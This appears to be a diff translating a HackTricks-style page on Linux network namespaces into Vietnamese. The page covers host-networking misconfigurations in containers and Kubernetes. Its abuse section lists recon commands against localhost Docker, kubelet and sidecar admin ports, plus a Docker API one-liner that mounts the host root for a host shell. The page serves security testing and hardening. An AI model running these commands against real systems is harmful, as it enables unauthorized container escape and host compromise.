@@ -1,22 +1,22 @@
-# Network Namespace
+# Namespace mạng
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
-## Overview
+## Tổng quan
 
-The network namespace isolates network-related resources such as interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, the UNIX-domain abstract socket namespace, and the contents of files like `/proc/net`.<sup>[[2]](#references)</sup> This is why a container can have what looks like its own `eth0`, its own local routes, and its own loopback device without owning the host's real network stack.
+Namespace mạng cô lập các tài nguyên liên quan đến mạng như giao diện mạng, địa chỉ IP, bảng định tuyến, trạng thái ARP/neighbor, quy tắc firewall, socket, namespace socket trừu tượng của UNIX-domain và nội dung của các tệp như `/proc/net`.<sup>[[2]](#references)</sup> Vì vậy, một container có thể có giao diện `eth0`, các tuyến cục bộ và thiết bị loopback riêng như thể chúng thuộc về nó, dù không sở hữu network stack thực của host.
 
-Security-wise, this matters because network isolation is about much more than port binding. A private network namespace limits what the workload can directly observe or reconfigure. Once that namespace is shared with the host, the container may suddenly gain visibility into host listeners, host-local services, abstract AF_UNIX endpoints, and network control points that were never meant to be exposed to the application.
+Về mặt bảo mật, điều này quan trọng vì cô lập mạng không chỉ là kiểm soát việc bind cổng. Một network namespace riêng tư giới hạn những gì workload có thể trực tiếp quan sát hoặc cấu hình lại. Khi namespace đó được chia sẻ với host, container có thể bất ngờ nhìn thấy các listener của host, dịch vụ chỉ truy cập được từ host, endpoint AF_UNIX trừu tượng và các điểm kiểm soát mạng vốn không được thiết kế để ứng dụng truy cập.
 
-## Operation
+## Hoạt động
 
-A freshly created network namespace begins with an empty or almost empty network environment until interfaces are attached to it. Container runtimes then create or connect virtual interfaces, assign addresses, and configure routes so the workload has the expected connectivity. In bridge-based deployments, this usually means the container sees a veth-backed interface connected to a host bridge. In Kubernetes, CNI plugins handle the equivalent setup for Pod networking.
+Một network namespace mới được tạo sẽ có môi trường mạng trống hoặc gần như trống cho đến khi các giao diện được gắn vào. Sau đó, container runtime tạo hoặc kết nối các giao diện ảo, gán địa chỉ và cấu hình tuyến để workload có kết nối như mong đợi. Trong các triển khai dựa trên bridge, thường thì container thấy một giao diện được hỗ trợ bởi veth và kết nối với bridge của host. Trong Kubernetes, CNI plugin đảm nhiệm việc thiết lập tương đương cho mạng Pod.
 
-This architecture explains why `--network=host` or `hostNetwork: true` is such a dramatic change. Instead of receiving a prepared private network stack, the workload joins the host's actual one.
+Kiến trúc này giải thích vì sao `--network=host` hoặc `hostNetwork: true` tạo ra thay đổi lớn như vậy. Thay vì được cấp một network stack riêng đã chuẩn bị sẵn, workload tham gia vào network stack thực của host.
 
-## Lab
+## Phòng lab
 
-You can see a nearly empty network namespace with:
+Bạn có thể xem một network namespace gần như trống bằng lệnh:
 
 ```bash
 sudo unshare --net --fork bash
@@ -24,34 +24,34 @@ ip addr
 ip route
 ```
 
-And you can compare normal and host-networked containers with:
+Và bạn có thể so sánh các container thông thường với các container sử dụng mạng của host bằng cách:
 
 ```bash
 docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
 docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
 ```
 
-The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.
+Container sử dụng host network không còn có chế độ xem socket và interface riêng biệt, được cô lập. Chỉ riêng thay đổi này đã rất đáng kể, ngay cả trước khi xét đến các capability mà process có.
 
 ## Runtime Usage
 
-Docker and Podman normally create a private network namespace for each container unless configured otherwise. Kubernetes usually gives each Pod its own network namespace, shared by the containers inside that Pod but separate from the host. That means `127.0.0.1` is usually Pod-local rather than container-local: a listener bound only to localhost in one container is typically reachable from its sidecars and siblings. Incus/LXC systems also provide rich network-namespace based isolation, often with a wider variety of virtual networking setups.
+Docker và Podman thường tạo một network namespace riêng cho mỗi container, trừ khi được cấu hình khác. Kubernetes thường cấp cho mỗi Pod một network namespace riêng, được các container bên trong Pod đó dùng chung nhưng tách biệt với host. Điều đó có nghĩa là `127.0.0.1` thường thuộc phạm vi Pod chứ không phải container: một listener chỉ bind vào localhost trong một container thường có thể được truy cập từ các sidecar và container cùng Pod. Hệ thống Incus/LXC cũng cung cấp khả năng cô lập dựa trên network namespace phong phú, thường hỗ trợ nhiều kiểu thiết lập mạng ảo hơn.
 
-The common principle is that private networking is the default isolation boundary, while host networking is an explicit opt-out from that boundary.
+Nguyên tắc chung là mạng riêng tư mặc định tạo thành ranh giới cô lập, còn host networking là lựa chọn chủ động để bỏ qua ranh giới đó.
 
 ## Misconfigurations
 
-The most important misconfiguration is simply sharing the host network namespace. This is sometimes done for performance, low-level monitoring, or convenience, but it removes one of the cleanest boundaries available to containers. Host-local listeners become reachable in a more direct way, localhost-only services may become accessible, and capabilities such as `CAP_NET_ADMIN` or `CAP_NET_RAW` become much more dangerous because the operations they enable are now applied to the host's own network environment.
+Cấu hình sai quan trọng nhất đơn giản là dùng chung network namespace của host. Đôi khi việc này được thực hiện vì hiệu năng, giám sát cấp thấp hoặc sự tiện lợi, nhưng nó loại bỏ một trong những ranh giới cô lập rõ ràng nhất dành cho container. Các listener chỉ dành cho host trở nên dễ truy cập trực tiếp hơn, các dịch vụ chỉ bind vào localhost có thể truy cập được, và những capability như `CAP_NET_ADMIN` hoặc `CAP_NET_RAW` trở nên nguy hiểm hơn nhiều vì các thao tác mà chúng cho phép giờ được áp dụng lên chính môi trường mạng của host.
 
-Another problem is overgranting network-related capabilities even when the network namespace is private. A private namespace does help, but it does not make raw sockets or advanced network control harmless.
+Một vấn đề khác là cấp quá nhiều network-related capability, ngay cả khi network namespace là riêng tư. Namespace riêng tư có giúp ích, nhưng không khiến raw socket hoặc các quyền kiểm soát mạng nâng cao trở nên vô hại.
 
-In Kubernetes, `hostNetwork: true` also changes how much faith you can place in Pod-level network segmentation. Kubernetes documents that many network plugins cannot properly distinguish `hostNetwork` Pod traffic for `podSelector` / `namespaceSelector` matching and therefore treat it as ordinary node traffic.<sup>[[1]](#references)</sup> From an attacker's point of view, that means a compromised `hostNetwork` workload should often be treated as a node-level network foothold rather than as a normal Pod still constrained by the same policy assumptions as overlay-network workloads.
+Trong Kubernetes, `hostNetwork: true` cũng làm giảm mức độ tin cậy có thể đặt vào việc phân đoạn mạng ở cấp Pod. Kubernetes ghi nhận rằng nhiều network plugin không thể phân biệt chính xác lưu lượng của Pod dùng `hostNetwork` khi khớp `podSelector` / `namespaceSelector` và do đó xử lý lưu lượng này như lưu lượng thông thường của node.<sup>[[1]](#references)</sup> Từ góc nhìn của attacker, điều đó có nghĩa là thường nên xem workload dùng `hostNetwork` đã bị compromise như một điểm foothold mạng cấp node, thay vì như một Pod thông thường vẫn bị ràng buộc bởi các giả định chính sách tương tự workload dùng overlay network.
 
 ## Abuse
 
-In weakly isolated setups, attackers may inspect host listening services, reach management endpoints bound only to loopback, sniff or interfere with traffic depending on the exact capabilities and environment, or reconfigure routing and firewall state if `CAP_NET_ADMIN` is present. In a cluster, this can also make lateral movement and control-plane reconnaissance easier.
+Trong các môi trường được cô lập yếu, attacker có thể kiểm tra các dịch vụ đang lắng nghe trên host, truy cập các endpoint quản lý chỉ bind vào loopback, sniff hoặc can thiệp vào lưu lượng tùy theo capability và môi trường cụ thể, hoặc cấu hình lại trạng thái định tuyến và firewall nếu có `CAP_NET_ADMIN`. Trong một cluster, điều này cũng có thể giúp lateral movement và trinh sát control plane dễ dàng hơn.
 
-If you suspect host networking, start by confirming that the visible interfaces and listeners belong to the host rather than to an isolated container network:
+Nếu nghi ngờ có host networking, hãy bắt đầu bằng cách xác nhận rằng các interface và listener hiển thị thuộc về host chứ không phải mạng container được cô lập:
 
 ```bash
 ip addr
@@ -59,7 +59,7 @@ ip route
 ss -lntup | head -n 50
 ```
 
-Loopback-only services are often the first interesting discovery:
+Các service chỉ lắng nghe trên loopback thường là phát hiện đáng chú ý đầu tiên:
 
 ```bash
 ss -lntp | grep '127.0.0.1'
@@ -67,16 +67,16 @@ curl -s http://127.0.0.1:2375/version 2>/dev/null
 curl -sk https://127.0.0.1:2376/version 2>/dev/null
 ```
 
-Abstract UNIX sockets are another easy-to-miss target because they are network-namespace scoped even though they do not look like TCP/UDP listeners and may not exist as filesystem paths under `/run`. A host-networked container can therefore inherit access to host-only control channels that were never bind-mounted into the container at all:
+Abstract UNIX socket cũng là một mục tiêu dễ bị bỏ sót vì chúng được giới hạn theo network namespace, dù không giống các listener TCP/UDP và có thể không tồn tại dưới dạng đường dẫn hệ thống tệp trong `/run`. Vì vậy, container dùng mạng của host có thể thừa hưởng quyền truy cập vào các kênh điều khiển chỉ dành cho host, dù các kênh đó chưa từng được bind-mount vào container:
 
 ```bash
 ss -xap 2>/dev/null | head -n 50
 grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
 ```
 
-A historical example was the `containerd-shim` abstract-socket exposure bug, but the broader lesson is more important than the specific CVE: once a workload joins the host network namespace, abstract AF_UNIX services become part of the attack surface too.<sup>[[3]](#references)</sup> If those sockets appear runtime-related or administrative, pivot to [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).
+Một ví dụ trong quá khứ là lỗi lộ abstract socket của `containerd-shim`, nhưng bài học rộng hơn quan trọng hơn CVE cụ thể: một khi workload tham gia network namespace của host, các dịch vụ abstract AF_UNIX cũng trở thành một phần của attack surface.<sup>[[3]](#references)</sup> Nếu các socket đó có vẻ liên quan đến runtime hoặc quản trị, hãy chuyển sang [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).
 
-If network capabilities are present, test whether the workload can inspect or alter the visible stack:
+Nếu có các network capability, hãy kiểm tra xem workload có thể kiểm tra hoặc thay đổi stack hiển thị hay không:
 
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
@@ -84,7 +84,7 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link show
 ```
 
-On modern kernels, host networking plus `CAP_NET_ADMIN` may also expose the packet path beyond simple `iptables` / `nftables` changes. `tc` qdiscs and filters are namespace-scoped too, so in a shared host network namespace they apply to the host interfaces the container can see. If `CAP_BPF` is additionally present, network-related eBPF programs such as TC and XDP loaders become relevant as well:<sup>[[4]](#references)</sup>
+Trên các kernel hiện đại, dùng mạng của host cùng với `CAP_NET_ADMIN` cũng có thể mở rộng quyền truy cập vào luồng gói tin, vượt xa các thay đổi đơn giản với `iptables` / `nftables`. Các qdisc và bộ lọc `tc` cũng được giới hạn theo namespace, nên trong network namespace dùng chung với host, chúng áp dụng cho các giao diện mạng của host mà container có thể nhìn thấy. Nếu có thêm `CAP_BPF`, các chương trình eBPF liên quan đến mạng như trình nạp TC và XDP cũng trở nên đáng lưu ý:<sup>[[4]](#references)</sup>
 
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
@@ -97,9 +97,9 @@ done
 bpftool net 2>/dev/null
 ```
 
-This matters because an attacker may be able to mirror, redirect, shape, or drop traffic at the host interface level, not just rewrite firewall rules. In a private network namespace those actions are contained to the container view; in a shared host namespace they become host-impacting.
+Điều này quan trọng vì kẻ tấn công có thể mirror, chuyển hướng, định hình hoặc loại bỏ traffic ở cấp giao diện host, chứ không chỉ sửa các firewall rule. Trong private network namespace, các hành động đó chỉ ảnh hưởng đến góc nhìn của container; trong shared host namespace, chúng có thể ảnh hưởng đến host.
 
-In cluster or cloud environments, host networking also justifies quick local recon of metadata and control-plane-adjacent services:
+Trong môi trường cluster hoặc cloud, host networking cũng là lý do để nhanh chóng recon cục bộ các dịch vụ metadata và dịch vụ nằm gần control plane:
 
 ```bash
 for u in \
@@ -110,7 +110,7 @@ for u in \
 done
 ```
 
-In Kubernetes, remember that compromising **any** container in a multi-container Pod also gives access to localhost listeners opened by sibling containers and sidecars because the whole Pod shares one network namespace. This becomes especially relevant with service-mesh, observability, and helper containers whose admin or debug interfaces are intentionally Pod-internal rather than cluster-wide:
+Trong Kubernetes, hãy nhớ rằng việc xâm nhập **bất kỳ** container nào trong Pod có nhiều container cũng cho phép truy cập các listener trên localhost do các container ngang hàng và sidecar mở, vì toàn bộ Pod dùng chung một network namespace. Điều này đặc biệt đáng lưu ý với service mesh, observability và các container hỗ trợ có giao diện quản trị hoặc debug được thiết kế để chỉ truy cập nội bộ trong Pod, thay vì trên toàn cluster:
 
 ```bash
 ss -lntup | grep -E '127.0.0.1|::1'
@@ -118,35 +118,35 @@ curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
 curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
 ```
 
-Treat "bound to localhost" as **Pod-private**, not **container-private**. After one container in the Pod is compromised, that assumption is gone.
+Hãy xem “bound to localhost” là **riêng tư trong Pod**, không phải **riêng tư trong container**. Sau khi một container trong Pod bị xâm nhập, giả định đó không còn đúng.
 
-### Full Example: Host Networking + Local Runtime / Kubelet Access
+### Ví dụ đầy đủ: Host networking + truy cập runtime cục bộ / Kubelet
 
-Host networking does not automatically provide host root, but it often exposes services that are intentionally reachable only from the node itself. If one of those services is weakly protected, host networking becomes a direct privilege-escalation path.
+Host networking không tự động cấp quyền root trên host, nhưng thường làm lộ các dịch vụ vốn chỉ được phép truy cập từ chính node đó. Nếu một trong các dịch vụ này được bảo vệ kém, host networking trở thành một đường dẫn leo thang đặc quyền trực tiếp.
 
-Docker API on localhost:
+Docker API trên localhost:
 
 ```bash
 curl -s http://127.0.0.1:2375/version 2>/dev/null
 docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
 
-Kubelet on localhost:
+Kubelet trên localhost:
 
 ```bash
 curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
 curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
 ```
 
-Impact:
+Tác động:
 
-- direct host compromise if a local runtime API is exposed without proper protection
-- cluster reconnaissance or lateral movement if kubelet or local agents are reachable
-- traffic manipulation or denial of service when combined with `CAP_NET_ADMIN`
+- xâm phạm trực tiếp host nếu API runtime cục bộ bị lộ mà không được bảo vệ đúng cách
+- do thám cluster hoặc di chuyển ngang nếu có thể truy cập kubelet hoặc các agent cục bộ
+- thao túng lưu lượng hoặc từ chối dịch vụ khi kết hợp với `CAP_NET_ADMIN`
 
 ## Checks
 
-The goal of these checks is to learn whether the process has a private network stack, what routes and listeners are visible, and whether the network view already looks host-like before you even test capabilities.
+Mục tiêu của các bước kiểm tra này là xác định liệu process có network stack riêng hay không, những route và listener nào có thể nhìn thấy, cũng như liệu góc nhìn về mạng đã giống với host trước cả khi bạn kiểm tra các capability hay chưa.
 
 ```bash
 readlink /proc/self/ns/net   # Current network namespace identifier
@@ -160,22 +160,21 @@ ss -xap                      # UNIX sockets, including abstract namespace entrie
 grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
 ```
 
-What is interesting here:
+Điều gì đáng chú ý ở đây:
 
-- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
-- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
-- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints. `ss -xap` and `/proc/net/unix` add the abstract-socket view that ordinary filesystem socket hunts miss.
-- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
-- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.
-- In multi-container Pods, localhost listeners belong to the whole Pod network namespace, so check sidecars and sibling containers before assuming a loopback-only port is unreachable from the compromised container.
+- Nếu `/proc/self/ns/net` và `/proc/1/ns/net` trông giống namespace của host, container có thể đang dùng chung network namespace của host hoặc một namespace không riêng tư khác.
+- `lsns -t net` và `ip netns identify` rất hữu ích khi shell đã ở bên trong một namespace có tên hoặc namespace persistent và bạn muốn đối chiếu nó với các đối tượng trong `/run/netns` từ phía host.
+- `ss -lntup` đặc biệt hữu ích vì nó cho thấy các listener chỉ bind trên loopback và các endpoint quản lý cục bộ. `ss -xap` và `/proc/net/unix` bổ sung góc nhìn về abstract socket mà các cuộc tìm kiếm socket thông thường trên filesystem sẽ bỏ sót.
+- Route, tên interface, ngữ cảnh firewall, trạng thái `tc` và các eBPF attachment trở nên quan trọng hơn nhiều nếu có `CAP_NET_ADMIN`, `CAP_NET_RAW` hoặc `CAP_BPF`.
+- Trong Kubernetes, việc phân giải tên service thất bại từ một Pod `hostNetwork` có thể chỉ đơn giản là do Pod không dùng `dnsPolicy: ClusterFirstWithHostNet`, chứ không phải service không tồn tại.
+- Trong các Pod nhiều container, listener trên localhost thuộc về toàn bộ network namespace của Pod; vì vậy, hãy kiểm tra sidecar và các container cùng Pod trước khi cho rằng một cổng chỉ bind trên loopback không thể truy cập từ container bị xâm nhập.
 
-When reviewing a container, always evaluate the network namespace together with the capability set. Host networking plus strong network capabilities is a very different posture from bridge networking plus a narrow default capability set.
+Khi đánh giá một container, hãy luôn xem xét network namespace cùng với tập capability. Dùng host networking và có network capability mạnh tạo ra tư thế bảo mật rất khác so với dùng bridge networking và tập capability mặc định hạn chế.
 
 ## References
 
-- [1] [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
-- [2] [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
-- [3] [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
-- [4] [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
-
+- [1] [Các lưu ý về Kubernetes NetworkPolicy và `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
+- [2] [Linux `network_namespaces(7)` và tính cô lập của abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
+- [3] [Thông báo bảo mật của containerd: abstract Unix domain socket bị lộ cho container dùng host network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
+- [4] [Yêu cầu về eBPF token và capability đối với các chương trình eBPF liên quan đến network](https://docs.ebpf.io/linux/concepts/token/)
 {{#include ../../../../../banners/hacktricks-training.md}}
